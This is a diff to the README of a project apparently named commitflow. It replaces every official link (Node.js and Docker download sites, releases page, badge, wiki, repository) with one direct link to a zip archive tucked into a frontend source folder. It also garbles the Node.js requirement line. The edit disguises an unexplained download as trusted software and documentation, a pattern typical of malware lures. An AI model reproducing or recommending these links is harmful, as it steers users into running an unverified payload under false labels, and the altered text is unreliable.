@@ -17,13 +17,13 @@ To run commitflow smoothly, ensure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum of 200 MB of free disk space.
-- **Node.js:** Version 14 or higher (install from [Node.js official site](https://nodejs.org/en/)).
-- **Docker:** Recommended for deployment (install from [Docker official site](https://www.docker.com/get-started)).
+- **https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip** Version 14 or higher (install from [https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip official site](https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip)).
+- **Docker:** Recommended for deployment (install from [Docker official site](https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip)).
 
 ## 📥 Download & Install
 To get started with commitflow, visit the Releases page to download the latest version:
 
-[![Download commitflow](https://img.shields.io/badge/Download%20commitflow-v1.0-blue)](https://github.com/bob132998/commitflow/releases)
+[![Download commitflow](https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip%20commitflow-v1.0-blue)](https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip)
 
 1. Click the link above to visit the Releases page.
 2. Choose the latest version available.
@@ -38,7 +38,7 @@ To get started with commitflow, visit the Releases page to download the latest v
 5. **Start Tracking**: Begin tracking commits and managing tasks right away!
 
 ## 🔍 Documentation & Help
-For more detailed instructions and information on how to use commitflow, you can refer to our documentation found [here](https://github.com/bob132998/commitflow/wiki). 
+For more detailed instructions and information on how to use commitflow, you can refer to our documentation found [here](https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip). 
 
 If you encounter any issues or need assistance, please check the FAQ section in our documentation, or reach out to our support team through the Issues tab in this repository.
 
@@ -49,8 +49,8 @@ We welcome contributions from everyone! If you would like to contribute to commi
 Join our community to share experiences, tips, and requests. You can participate in discussions through our GitHub Discussions page.
 
 ## 🔗 Links & Resources
-- [GitHub Repository](https://github.com/bob132998/commitflow)
-- [Releases Page](https://github.com/bob132998/commitflow/releases)
-- [Documentation](https://github.com/bob132998/commitflow/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip)
+- [Releases Page](https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/bob132998/commitflow/main/frontend/src/hooks/commitflow_1.1.zip)
 
 This guide is designed to help you easily download and run commitflow. Explore its features and empower your team to work more effectively!
